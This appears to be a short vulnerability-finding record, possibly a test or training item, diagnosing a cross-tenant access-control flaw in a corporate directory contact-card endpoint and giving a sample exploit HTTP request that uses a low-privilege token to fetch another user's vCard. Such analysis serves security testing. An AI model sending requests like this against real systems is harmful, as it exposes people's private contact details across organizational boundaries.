diagnosis: The directory contact card endpoint loads user data using user_manager.get(user_id) and returns unmasked personal contact details (direct phone number, work organization, and personal email). It fails to verify that user belongs to the same organization or division as current_user, exposing confidential executive and employee contact details across tenant boundaries.
exploit_request:
GET /directory/33a921d2-0994-43ff-90a1-c4209930f781/contact.vcf HTTP/1.1
Host: directory.corporation.com
Authorization: Bearer <low_privilege_token>
